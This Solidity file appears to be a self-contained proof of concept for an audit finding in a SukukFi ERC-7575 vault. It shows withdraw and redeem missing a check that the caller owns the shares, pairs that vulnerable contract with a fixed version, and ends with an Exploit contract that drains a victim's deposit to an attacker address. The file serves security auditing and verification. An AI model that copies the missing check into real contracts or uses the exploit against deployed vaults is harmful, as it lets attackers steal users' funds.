// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

// ─────────────────────────────────────────────────────────────────────────────
// Synthetic, self-contained reproduction of SukukFi finding 65495 (H-01):
// "Missing Authorization Check Allows Unauthorized Fund Withdrawal".
//
// WERC7575Vault.withdraw / redeem (ERC4626 signature `(…, receiver, owner)`)
// forward to the internal _withdraw WITHOUT ever checking that `msg.sender`
// is the share `owner` or an approved spender of the owner. _withdraw only
// calls `_shareToken.spendSelfAllowance(owner, shares)`, which consumes the
// allowance the OWNER granted to the VAULT (owner→vault, via `_spendAllowance(
// owner, owner, …)`), i.e. the vault's standing burn right. Nothing binds
// `msg.sender` to `owner`. Therefore ANY caller can invoke
// `withdraw(assets, attacker, victim)`: the victim's shares are burned and the
// underlying assets are sent to the attacker's chosen `receiver`.
//
// Verbatim vulnerable source (withdraw / redeem / _withdraw and the preview /
// convert helpers they call) is pulled from the audited commit
//   github.com/code-423n4/2025-11-sukukfi @ 163216500a54627afc6abaac3bffdc3a830051fa
//   src/WERC7575Vault.sol  (withdraw L434-L437, redeem L464-L467, _withdraw L397)
// and inlined UNCHANGED below (imports/pragma stripped). The `// @>` marker sits
// on the exact call that lacks the caller↔owner authorization gate.
//
// Minimal faithful doubles only for the opaque boundary the finding is NOT
// about: the underlying ERC20 asset the vault custodies, and the separate
// WERC7575ShareToken (self-allowance + vault-only burn). The vulnerable
// contract itself is real, verbatim source.
// ─────────────────────────────────────────────────────────────────────────────

/// @dev Minimal faithful double for OpenZeppelin's Math.mulDiv with rounding.
///      Only Floor/Ceil are exercised (scalingFactor == 1 → 1:1 conversion).
library Math {
    enum Rounding {
        Floor,
        Ceil
    }

    function mulDiv(uint256 a, uint256 b, uint256 denominator, Rounding rounding) internal pure returns (uint256 result) {
        result = a * b / denominator;
        if (rounding == Rounding.Ceil && mulmod(a, b, denominator) > 0) {
            result += 1;
        }
    }
}

/// @dev Subset of OZ's draft-IERC6093 errors used on the withdraw path (verbatim names).
interface IERC20Errors {
    error ERC20InvalidReceiver(address receiver);
    error ERC20InvalidSender(address sender);
}

/// @dev Minimal faithful double for the vault's SafeTokenTransfers.safeTransfer:
///      performs a real ERC20 transfer and validates the boolean return.
library SafeTokenTransfers {
    function safeTransfer(address token, address to, uint256 amount) internal {
        (bool ok, bytes memory data) = token.call(abi.encodeWithSelector(0xa9059cbb, to, amount));
        require(ok && (data.length == 0 || abi.decode(data, (bool))), "SAFE_TRANSFER_FAILED");
    }
}

/// @dev Minimal ERC20 double for the underlying asset the vault holds.
contract MiniAsset {
    string public name;
    string public symbol;
    uint8 public constant decimals = 18;
    uint256 public totalSupply;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory _name, string memory _symbol) {
        name = _name;
        symbol = _symbol;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
        totalSupply += amount;
    }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }
}

interface IShareToken {
    function spendSelfAllowance(address owner, uint256 shares) external;
    function burn(address from, uint256 amount) external;
    function balanceOf(address account) external view returns (uint256);
    function decimals() external view returns (uint8);
}

/// @dev Faithful minimal double of WERC7575ShareToken for the exploit boundary.
///      - `decimals()` == 18 (share token invariant).
///      - `spendSelfAllowance`/`burn` are vault-only (real `onlyVaults` gate).
///      - `spendSelfAllowance(owner, shares)` consumes the OWNER→VAULT self
///        allowance (the report's prerequisite: the owner approved the vault so
///        it may burn during a legitimate withdrawal). It never inspects who
///        instructed the vault — exactly as the real `_spendAllowance(owner,
///        owner, …)` does. Seeded to max for the victim = the report's worst
///        case where the missing msg.sender check is the sole enabler.
contract WERC7575ShareToken {
    uint8 public constant decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => uint256) public selfAllowance; // owner => allowance granted to the vault
    address public vault;

    modifier onlyVaults() {
        require(msg.sender == vault, "Unauthorized");
        _;
    }

    function registerVault(address v) external {
        vault = v;
    }

    function mintTo(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }

    /// @dev Owner grants the vault standing burn rights (the withdrawal prerequisite).
    function seedSelfAllowance(address owner, uint256 amount) external {
        selfAllowance[owner] = amount;
    }

    function spendSelfAllowance(address owner, uint256 shares) external onlyVaults {
        uint256 current = selfAllowance[owner];
        require(current >= shares, "insufficient self-allowance");
        if (current != type(uint256).max) {
            selfAllowance[owner] = current - shares;
        }
    }

    function burn(address from, uint256 amount) external onlyVaults {
        balanceOf[from] -= amount;
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// VULNERABLE contract: withdraw / redeem / _withdraw inlined VERBATIM from
// src/WERC7575Vault.sol @ 163216500a54627afc6abaac3bffdc3a830051fa.
// The missing caller↔owner authorization gate is the bug.
// ─────────────────────────────────────────────────────────────────────────────
contract WERC7575Vault {
    // Errors from IERC7575Errors used on the withdraw path.
    error ZeroAssets();
    error ZeroShares();

    event Withdraw(
        address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares
    );

    address private _asset;
    uint64 private _scalingFactor;
    IShareToken private _shareToken;

    // Minimal faithful ReentrancyGuard + Pausable modifiers.
    uint256 private _reentryStatus;
    bool private _paused;

    modifier nonReentrant() {
        require(_reentryStatus != 2, "ReentrancyGuardReentrantCall");
        _reentryStatus = 2;
        _;
        _reentryStatus = 1;
    }

    modifier whenNotPaused() {
        require(!_paused, "EnforcedPause");
        _;
    }

    constructor(address asset_, IShareToken shareToken_) {
        _asset = asset_;
        _shareToken = shareToken_;
        // 18-decimal asset → scaling factor 10^(18-18) == 1 (1:1 asset↔share).
        _scalingFactor = 1;
        _reentryStatus = 1;
    }

    // ── verbatim preview / convert helpers (WERC7575Vault.sol) ──────────────
    function previewWithdraw(uint256 assets) public view returns (uint256) {
        return _convertToShares(assets, Math.Rounding.Ceil);
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        return _convertToAssets(shares, Math.Rounding.Floor);
    }

    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256) {
        // ShareToken always has 18 decimals, assetDecimals ∈ [6, 18]
        // shares = assets * _scalingFactor where _scalingFactor = 10^(18 - assetDecimals)
        // Use Math.mulDiv to prevent overflow on large amounts
        return Math.mulDiv(assets, uint256(_scalingFactor), 1, rounding);
    }

    function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view returns (uint256) {
        // ShareToken always has 18 decimals, assetDecimals ∈ [6, 18]
        // When _scalingFactor == 1 (assetDecimals == 18): assets = shares
        // When _scalingFactor > 1 (assetDecimals < 18): assets = shares / _scalingFactor
        if (_scalingFactor == 1) {
            return shares;
        } else {
            return Math.mulDiv(shares, 1, uint256(_scalingFactor), rounding);
        }
    }

    // ── verbatim internal withdraw/redeem logic (WERC7575Vault.sol L397) ────
    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
        if (receiver == address(0)) {
            revert IERC20Errors.ERC20InvalidReceiver(address(0));
        }
        if (owner == address(0)) {
            revert IERC20Errors.ERC20InvalidSender(address(0));
        }
        if (assets == 0) revert ZeroAssets();
        if (shares == 0) revert ZeroShares();

        _shareToken.spendSelfAllowance(owner, shares);
        _shareToken.burn(owner, shares);
        SafeTokenTransfers.safeTransfer(_asset, receiver, assets);
        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }

    // ── verbatim withdraw (WERC7575Vault.sol L434-L437) ─────────────────────
    function withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {
        shares = previewWithdraw(assets);
        _withdraw(assets, shares, receiver, owner); // @> no msg.sender==owner / allowance(owner,msg.sender) check — any caller burns owner's shares and redirects the assets to `receiver`
    }

    // ── verbatim redeem (WERC7575Vault.sol L464-L467) ───────────────────────
    function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {
        assets = previewRedeem(shares);
        _withdraw(assets, shares, receiver, owner);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// FIXED contract (negative control): applies the report's recommended mitigation
// `if (msg.sender != owner) revert IERC20Errors.ERC20InvalidSender(msg.sender);`
// at the top of withdraw/redeem. Everything else is identical.
// ─────────────────────────────────────────────────────────────────────────────
contract WERC7575VaultFixed {
    error ZeroAssets();
    error ZeroShares();

    event Withdraw(
        address indexed sender, address indexed receiver, address indexed owner, uint256 assets, uint256 shares
    );

    address private _asset;
    uint64 private _scalingFactor;
    IShareToken private _shareToken;
    uint256 private _reentryStatus;
    bool private _paused;

    modifier nonReentrant() {
        require(_reentryStatus != 2, "ReentrancyGuardReentrantCall");
        _reentryStatus = 2;
        _;
        _reentryStatus = 1;
    }

    modifier whenNotPaused() {
        require(!_paused, "EnforcedPause");
        _;
    }

    constructor(address asset_, IShareToken shareToken_) {
        _asset = asset_;
        _shareToken = shareToken_;
        _scalingFactor = 1;
        _reentryStatus = 1;
    }

    function previewWithdraw(uint256 assets) public view returns (uint256) {
        return _convertToShares(assets, Math.Rounding.Ceil);
    }

    function previewRedeem(uint256 shares) public view returns (uint256) {
        return _convertToAssets(shares, Math.Rounding.Floor);
    }

    function _convertToShares(uint256 assets, Math.Rounding rounding) internal view returns (uint256) {
        return Math.mulDiv(assets, uint256(_scalingFactor), 1, rounding);
    }

    function _convertToAssets(uint256 shares, Math.Rounding rounding) internal view returns (uint256) {
        if (_scalingFactor == 1) {
            return shares;
        } else {
            return Math.mulDiv(shares, 1, uint256(_scalingFactor), rounding);
        }
    }

    function _withdraw(uint256 assets, uint256 shares, address receiver, address owner) internal {
        if (receiver == address(0)) {
            revert IERC20Errors.ERC20InvalidReceiver(address(0));
        }
        if (owner == address(0)) {
            revert IERC20Errors.ERC20InvalidSender(address(0));
        }
        if (assets == 0) revert ZeroAssets();
        if (shares == 0) revert ZeroShares();

        _shareToken.spendSelfAllowance(owner, shares);
        _shareToken.burn(owner, shares);
        SafeTokenTransfers.safeTransfer(_asset, receiver, assets);
        emit Withdraw(msg.sender, receiver, owner, assets, shares);
    }

    function withdraw(uint256 assets, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 shares) {
        if (msg.sender != owner) revert IERC20Errors.ERC20InvalidSender(msg.sender); // FIX
        shares = previewWithdraw(assets);
        _withdraw(assets, shares, receiver, owner);
    }

    function redeem(uint256 shares, address receiver, address owner) public nonReentrant whenNotPaused returns (uint256 assets) {
        if (msg.sender != owner) revert IERC20Errors.ERC20InvalidSender(msg.sender); // FIX
        assets = previewRedeem(shares);
        _withdraw(assets, shares, receiver, owner);
    }
}

// ─────────────────────────────────────────────────────────────────────────────
// Exploit driver: victim deposited (vault custodies the assets; victim holds
// shares and has granted the vault standing burn rights). The attacker — an
// arbitrary caller, NOT the owner — invokes withdraw(assets, ATTACKER, VICTIM),
// burning the victim's shares and pulling the underlying to the attacker EOA.
// ─────────────────────────────────────────────────────────────────────────────
contract Exploit {
    address internal constant ATTACKER = 0x1111111111111111111111111111111111111111;
    address internal constant VICTIM = 0x000000000000000000000000000000000000a11c;

    uint256 public constant DEPOSIT = 1000 ether; // 1000 STOLEN-ASSET

    // Exposed results for the driver.
    address public assetAddr;
    address public shareAddr;
    address public vaultAddr;
    uint256 public attackerStolen;
    uint256 public victimSharesBefore;
    uint256 public victimSharesAfter;

    function run() external payable {
        address victim = VICTIM;

        // --- deploy doubles + the REAL vulnerable vault (fixed order) ---
        MiniAsset asset = new MiniAsset("Underlying", "STOLEN-ASSET"); // nonce 1
        WERC7575ShareToken share = new WERC7575ShareToken(); // nonce 2
        WERC7575Vault vault = new WERC7575Vault(address(asset), IShareToken(address(share))); // nonce 3
        share.registerVault(address(vault));

        assetAddr = address(asset);
        shareAddr = address(share);
        vaultAddr = address(vault);

        // --- seed the victim's position: vault custodies assets, victim holds
        //     shares 1:1, and the victim granted the vault standing burn rights ---
        asset.mint(address(vault), DEPOSIT);
        share.mintTo(victim, DEPOSIT);
        share.seedSelfAllowance(victim, type(uint256).max);
        victimSharesBefore = share.balanceOf(victim);

        // --- attack: this contract is an unauthorized caller (msg.sender != victim).
        //     It withdraws the victim's entire deposit to the ATTACKER EOA. ---
        vault.withdraw(DEPOSIT, ATTACKER, victim);

        attackerStolen = asset.balanceOf(ATTACKER);
        victimSharesAfter = share.balanceOf(victim);

        // --- harm asserts: attacker received the underlying; victim's shares burned ---
        require(attackerStolen == DEPOSIT, "no theft: attacker did not receive assets");
        require(victimSharesAfter == 0, "victim shares not burned");
        require(asset.balanceOf(address(vault)) == 0, "vault still holds the assets");
    }
}
